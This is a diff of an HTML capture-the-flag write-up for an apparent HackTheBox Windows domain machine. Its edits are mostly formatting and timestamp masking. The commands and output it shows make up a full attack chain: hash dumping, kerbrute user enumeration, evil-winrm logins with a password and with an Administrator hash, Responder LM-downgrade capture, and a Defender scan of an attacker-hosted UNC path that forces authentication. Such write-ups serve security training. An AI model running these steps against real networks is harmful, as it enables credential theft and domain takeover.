@@ -712,34 +712,34 @@ ff02::2 ip6-allrouters
 <blockquote>
 <div class="listingblock">
 <div class="content">
-<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="nb">cat </span>user_hashes.txt.ntds | <span class="nb">head</span> <span class="nt">-n</span> 1
+<pre class="rouge highlight"><code data-lang="shell">$ cat user_hashes.txt.ntds | head -n 1
 
   Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
 
-<span class="nv">$ </span><span class="nb">cat </span>user_hashes.txt.ntds | <span class="nb">head</span> <span class="nt">-n</span> 1 | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">':'</span> <span class="nt">-f1</span>
+$ cat user_hashes.txt.ntds | head -n 1 | cut -d':' -f1
 
   Administrator
 
-<span class="nv">$ </span><span class="nb">cat </span>user_hashes.txt.ntds | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">':'</span> <span class="nt">-f1</span> <span class="o">&gt;</span> ../usernames.txt
+$ cat user_hashes.txt.ntds | cut -d':' -f1 > ../usernames.txt
 
-<span class="nv">$ </span>./kerbrute_linux_amd64 userenum <span class="nt">-d</span> htb.local <span class="nt">--dc</span> apt.htb.local <span class="nt">-o</span> kerbrute.txt <span class="nt">-v</span> usernames.txt
-      <em>             </em>               <em>
-     / /</em><em>_  </em><em><em>/ /</em>  </em><em><em></em>  <em>/ /</em><em>
-    / //</em>/ _ <span class="se">\/</span> </em><em>/ <em> <span class="se">\/</span> </em></em>/ / / / <em>/ _ <span class="se">\</span>
-   / ,&lt; /  </em>/ /  / /<em>/ / /  / /</em>/ / /<em>/  <em>/
-  /</em>/|<em>|<span class="se">\</em></span></em>/<em>/  /</em>.<em><em>/</em>/   <span class="se">_</span>_,<em>/<span class="se">\</em></span><em>/<span class="se">\</em></span></em>/
+$ ./kerbrute_linux_amd64 userenum -d htb.local --dc apt.htb.local -o kerbrute.txt -v usernames.txt
+      __             __               __
+     / /_____  _____/ /_  _______  __/ /____
+    / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+   / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+  /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
 
-  Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - xx/xx/xx - Ronnie Flathers @ropnop
+  Version: v1.0.3 (9dad6e1) - xx/xx/xx - Ronnie Flathers @ropnop
 
-  xxxx/xx/xx xx:xx:xx <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
-  xxxx/xx/xx xx:xx:xx <span class="o">&gt;</span>  	apt.htb.local:88
-  <span class="o">[</span>...omitted...]
+  xxxx/xx/xx xx:xx:xx >  Using KDC(s):
+  xxxx/xx/xx xx:xx:xx >  	apt.htb.local:88
+  [...omitted...]
 
-<span class="nv">$ </span><span class="nb">cat </span>kerbrute.txt | <span class="nb">grep </span>VALID
+$ cat kerbrute.txt | grep VALID
 
-  xxxx/xx/xx xx:xx:xx <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 Administrator@htb.local
-  xxxx/xx/xx xx:xx:xx <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 APT<span class="nv">$@</span>htb.local
-  xxxx/xx/xx xx:xx:xx <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 henry.vinson@htb.local</code></pre>
+  xxxx/xx/xx xx:xx:xx >  [+] VALID USERNAME:	 Administrator@htb.local
+  xxxx/xx/xx xx:xx:xx >  [+] VALID USERNAME:	 APT$@htb.local
+  xxxx/xx/xx xx:xx:xx >  [+] VALID USERNAME:	 henry.vinson@htb.local</code></pre>
 </div>
 </div>
 </blockquote>
@@ -776,14 +776,14 @@ ff02::2 ip6-allrouters
 
   <span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>henry.vinson@apt.htb.ccache
 
-<span class="nv">$ </span>klist <span class="nt">-c</span> henry.vinson@apt.htb.ccache                                                                         1 ⨯
+<span class="nv">$ </span>klist <span class="nt">-c</span> henry.vinson@apt.htb.ccache
 
   Ticket cache: FILE:henry.vinson@apt.htb.ccache
   Default principal: henry.vinson@HTB.LOCAL
 
   Valid starting       Expires              Service principal
-  04/09/2021 16:34:58  04/10/2021 02:34:58  krbtgt/HTB.LOCAL@HTB.LOCAL
-  	  renew <span class="k">until </span>04/10/2021 16:34:58</code></pre>
+  xx/xx/xxxx xx:xx:xx  xx/xx/xxxx xx:xx:xx  krbtgt/HTB.LOCAL@HTB.LOCAL
+  	  renew <span class="k">until </span>xx/xx/xxxx xx:xx:xx</code></pre>
 </div>
 </div>
 </blockquote>
@@ -867,11 +867,11 @@ ff02::2 ip6-allrouters
 <div class="content">
 <pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> apt.htb <span class="nt">-u</span> henry.vinson_adm <span class="nt">-p</span> <span class="s1">'G1#Ny5@2dvht'</span> <span class="nt">--no-colors</span>
 
-PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+PS <span style="color:#779ECB">C:\Users\henry.vinson_adm\Documents></span> <span class="nb">whoami
 
   </span>htb<span class="se">\h</span>enry.vinson_adm
 
-PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; ipconfig
+PS <span style="color:#779ECB">C:\Users\henry.vinson_adm\Documents></span> ipconfig
 
   Windows IP Configuration
 
@@ -888,7 +888,7 @@ PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<spa
                                          fe80::250:56ff:feb9:75a0%5
                                          10.10.10.2
 
-PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; <span class="nb">dir</span> ..<span class="se">\D</span>esktop
+PS <span style="color:#779ECB">C:\Users\henry.vinson_adm\Documents></span> <span class="nb">dir</span> ..<span class="se">\D</span>esktop
 
       Directory: C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>esktop
 
@@ -907,7 +907,7 @@ PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<spa
 <blockquote>
 <div class="listingblock">
 <div class="content">
-<pre class="rouge highlight"><code data-lang="shell">PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; net localgroup <span class="s2">"Remote Management Users"</span>
+<pre class="rouge highlight"><code data-lang="shell">PS <span style="color:#779ECB">C:\Users\henry.vinson_adm\Documents></span> net localgroup <span class="s2">"Remote Management Users"</span>
 
   Alias name     Remote Management Users
   Comment        Members of this group can access WMI resources over management protocols <span class="o">(</span>such as WS-Management via the Windows Remote Management service<span class="o">)</span><span class="nb">.</span> This applies only to WMI namespaces that grant access to the user.
@@ -935,9 +935,9 @@ PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<spa
 <blockquote>
 <div class="listingblock">
 <div class="content">
-<pre class="rouge highlight"><code data-lang="shell">PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\D</span>ocuments&gt; <span class="nb">cd</span> ..<span class="se">\A</span>ppData
+<pre class="rouge highlight"><code data-lang="shell">PS <span style="color:#779ECB">C:\Users\henry.vinson_adm\Documents></span> <span class="nb">cd</span> ..<span class="se">\A</span>ppData
 
-PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\A</span>ppData&gt; <span class="nb">type </span>Roaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt</code></pre>
+PS <span style="color:#779ECB">C:\Users\henry.vinson_adm\AppData></span> <span class="nb">type </span>Roaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt</code></pre>
 </div>
 </div>
 </blockquote>
@@ -993,41 +993,41 @@ invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemP
 <blockquote>
 <div class="listingblock">
 <div class="content">
-<pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span><span class="nb">cat</span> /etc/responder/Responder.conf | <span class="nb">grep</span> <span class="nt">-i</span> challenge
+<pre class="rouge highlight"><code data-lang="console">$ cat /etc/responder/Responder.conf | grep -i challenge
 
-  <span class="p">;</span> Custom challenge.
-  <span class="p">;</span> Use <span class="s2">"Random"</span> <span class="k">for </span>generating a random challenge <span class="k">for </span>each requests <span class="o">(</span>Default<span class="o">)</span>
-  Challenge <span class="o">=</span> 1122334455667788
+  ; Custom challenge.
+  ; Use "Random" for generating a random challenge for each requests (Default)
+  Challenge = 1122334455667788
 
-<span class="nv">$ </span><span class="nb">sudo </span>responder <span class="nt">-I</span> tun0 <span class="nt">--lm</span>
+$ sudo responder -I tun0 --lm
 
-                                           <em>
+                                           __
     .----.-----.-----.-----.-----.-----.--|  |.-----.----.
-    |   <em>|  <span class="nt">-</em></span>|<em> <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-</em></span>|   _|
-    |<em>| |</em><em></em>|</em><em><em>|   </em>|<em></em></em>|<em>|</em>|<em><em></em>||<em></em></em>|<em>|
-                     |</em>|
+    |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+    |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                     |__|
 
-             NBT-NS, LLMNR &amp; MDNS Responder 3.0.2.0
+             NBT-NS, LLMNR & MDNS Responder 3.0.2.0
 
-    Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
-    To <span class="nb">kill </span>this script hit CTRL-C
+    Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+    To kill this script hit CTRL-C
 
-    <span class="o">[</span>...omitted...]
-    <span class="o">[</span>+] Servers:
-        <span class="o">[</span>...omitted...]
-        SMB server                 <span class="o">[</span>ON]
-    <span class="o">[</span>...omitted...]
+    [...omitted...]
+    [+] Servers:
+        [...omitted...]
+        SMB server                 [ON]
+    [...omitted...]
 
-    <span class="o">[</span>+] Poisoning Options:
-        <span class="o">[</span>...omitted...]
-        Force LM downgrade         <span class="o">[</span>ON]
-    <span class="o">[</span>...omitted...]
+    [+] Poisoning Options:
+        [...omitted...]
+        Force LM downgrade         [ON]
+    [...omitted...]
 
-    <span class="o">[</span>+] Generic Options:
-        Responder NIC              <span class="o">[</span>tun0]
-        Responder IP               <span class="o">[</span>10.10.14.11]
-        Challenge <span class="nb">set</span>              <span class="o">[</span>1122334455667788]
-    <span class="o">[</span>...omitted...]</code></pre>
+    [+] Generic Options:
+        Responder NIC              [tun0]
+        Responder IP               [10.10.14.11]
+        Challenge set              [1122334455667788]
+    [...omitted...]</code></pre>
 </div>
 </div>
 </blockquote>
@@ -1039,9 +1039,9 @@ invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemP
 <blockquote>
 <div class="listingblock">
 <div class="content">
-<pre class="rouge highlight"><code data-lang="shell">PS C:<span class="se">\U</span>sers<span class="se">\h</span>enry.vinson_adm<span class="se">\A</span>ppData&gt; <span class="nb">cd</span> <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows Defender</span><span class="se">\p</span><span class="s2">latform"</span>
+<pre class="rouge highlight"><code data-lang="shell">PS <span style="color:#779ECB">C:\Users\henry.vinson_adm\AppData></span> <span class="nb">cd</span> <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows Defender</span><span class="se">\p</span><span class="s2">latform"</span>
 
-PS C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows Defender<span class="se">\p</span>latform&gt; <span class="nb">dir
+PS <span style="color:#779ECB">C:\ProgramData\Microsoft\Windows Defender\platform></span> <span class="nb">dir
 
 
       </span>Directory: C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows Defender<span class="se">\p</span>latform
@@ -1052,9 +1052,9 @@ PS C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span
   d-----       11/10/2020  11:09 AM                4.18.2010.7-0
   d-----        3/17/2021   3:13 PM                4.18.2102.4-0
 
-PS C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows Defender<span class="se">\p</span>latform&gt; <span class="nb">cd </span>4.18.2010.7-0
+PS <span style="color:#779ECB">C:\ProgramData\Microsoft\Windows Defender\platform></span> <span class="nb">cd </span>4.18.2010.7-0
 
-C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows Defender<span class="se">\p</span>latform<span class="se">\4</span>.18.2010.7-0&gt; .<span class="se">\M</span>pCmdRun.exe <span class="nt">-Scan</span> <span class="nt">-ScanType</span> 3 <span class="nt">-File</span> <span class="se">\\</span>10.10.14.11<span class="se">\f</span>ile.txt</code></pre>
+PS <span style="color:#779ECB">C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0></span> .<span class="se">\M</span>pCmdRun.exe <span class="nt">-Scan</span> <span class="nt">-ScanType</span> 3 <span class="nt">-File</span> <span class="se">\\</span>10.10.14.11<span class="se">\f</span>ile.txt</code></pre>
 </div>
 </div>
 </blockquote>
@@ -1078,17 +1078,17 @@ C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span cl
 <blockquote>
 <div class="listingblock">
 <div class="content">
-<pre class="rouge highlight"><code data-lang="console"><span class="gp">PS C:\Users\henry.vinson_adm\Documents&gt;</span><span class="w"> </span>Get-ADComputer <span class="s2">"APT"</span>
-<span class="go">
-  DistinguishedName : CN=APT,OU=Domain Controllers,DC=htb,DC=local
-  DNSHostName       : apt.htb.local
+<pre class="rouge highlight"><code data-lang="shell">PS <span style="color:#779ECB">C:\Users\henry.vinson_adm\Documents></span> Get-ADComputer <span class="s2">"APT"</span>
+
+  DistinguishedName : <span class="nv">CN</span><span class="o">=</span>APT,OU<span class="o">=</span>Domain Controllers,DC<span class="o">=</span>htb,DC<span class="o">=</span><span class="nb">local
+  </span>DNSHostName       : apt.htb.local
   Enabled           : True
   Name              : APT
   ObjectClass       : computer
   ObjectGUID        : a78acf4d-42b5-49bc-9855-2389a80e726d
-</span><span class="gp">  SamAccountName    : APT$</span><span class="w">
-</span><span class="go">  SID               : S-1-5-21-2993095098-2100462451-206186470-1001
-  UserPrincipalName :</span></code></pre>
+  SamAccountName    : APT<span class="err">$</span>
+  SID               : S-1-5-21-2993095098-2100462451-206186470-1001
+  UserPrincipalName :</code></pre>
 </div>
 </div>
 </blockquote>
@@ -1157,11 +1157,11 @@ C:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span cl
 <div class="content">
 <pre class="rouge highlight"><code data-lang="shell"><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> apt.htb <span class="nt">-u</span> Administrator <span class="nt">-H</span> c370bddf384a691d811ff3495e8a72e2 <span class="nt">--no-colors</span>
 
-PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+PS <span style="color:#779ECB">C:\Users\Administrator\Documents></span> <span class="nb">whoami
 
   </span>htb<span class="se">\a</span>dministrator
 
-PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">dir</span> ..<span class="se">\D</span>esktop
+PS <span style="color:#779ECB">C:\Users\Administrator\Documents></span> <span class="nb">dir</span> ..<span class="se">\D</span>esktop
 
 
       Directory: C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
@@ -1169,10 +1169,10 @@ PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span c
 
   Mode                LastWriteTime         Length Name
   <span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
-  <span class="nt">-ar---</span>        4/10/2021   9:11 AM             34 root.txt
+  <span class="nt">-ar---</span>       xx/xx/xxxx  xx:xx XX             34 root.txt
 
 
-PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; ipconfig
+PS <span style="color:#779ECB">C:\Users\Administrator\Documents></span> ipconfig
 
   Windows IP Configuration
 
@@ -1213,6 +1213,9 @@ PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span c
 </li>
 <li>
 <p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level" class="bare">https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level</a></p>
+</li>
+<li>
+<p><a href="https://book.hacktricks.xyz/windows/active-directory-methodology/printers-spooler-service-abuse" class="bare">https://book.hacktricks.xyz/windows/active-directory-methodology/printers-spooler-service-abuse</a></p>
 </li>
 </ul>
 </div>
